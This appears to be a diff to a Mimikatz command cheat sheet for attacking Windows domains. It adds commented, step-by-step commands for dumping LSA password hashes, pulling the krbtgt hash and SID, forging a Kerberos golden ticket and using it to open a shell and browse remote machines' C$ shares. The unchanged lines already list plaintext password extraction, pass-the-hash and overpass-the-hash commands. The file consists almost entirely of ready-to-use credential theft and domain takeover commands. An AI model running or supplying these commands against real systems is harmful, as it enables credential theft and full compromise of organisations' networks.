@@ -14,15 +14,23 @@ The main functions that Mimikatz enables include:
 
 # Get elevated privileges
 privilege::debug
+;; here mimikatz should return a '20' ok
+;; This ensures that you're running mimikatz as an administrator;
+;; if you don't run mimikatz as an administrator, mimikatz will not run properly
 
 # Start logging
 log customlogfilename.log
+
+# Dump hashes
+;; this will dump system hashes
+lsadump::lsa /patch
 
 # Extract plaintext passwords
 sekurlsa::logonpasswords
 
 # Perform Pass-The-Hash Attack
 sekurlsa::pth /user:Administrator /domain:localhost /ntlm:<NTHashHere>
+
 # Dump credentials
 Invoke-Mimikatz -DumpCreds
 
@@ -31,3 +39,16 @@ Invoke-Mimikatz -DumpCreds -ComputerName @("sys1", "sys2")
 
 # Overpass the hash 
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:mychild1.myforest.local /html:<ntlmhash> /run:powershell.exe"'
+
+# Create a Golden Ticket
+privilege::debug
+lsadump::lsa /inject /name:krbtgt   ;; This dumps the hash and security identifier of the 
+;; Kerberos Ticket Granting Ticket account allowing you to create a golden ticket
+;; in the next command we have to insert the data shown in the lsadump::lsa /inject command
+kerberos::golden /user:Administrator /domain:<domain.local> /sid:<shownInPreviousCommandFirstLine> /krbtgt:<shownInPreviousCommandUnderPrimaryNTLM> /id:500
+
+;; once we have a golden ticket we can open a shell to access all machines in the domain with:
+misc::cmd
+;; now try:
+dir \\Name-Of-Machine\C$
+;; it will show the content of the specified machine
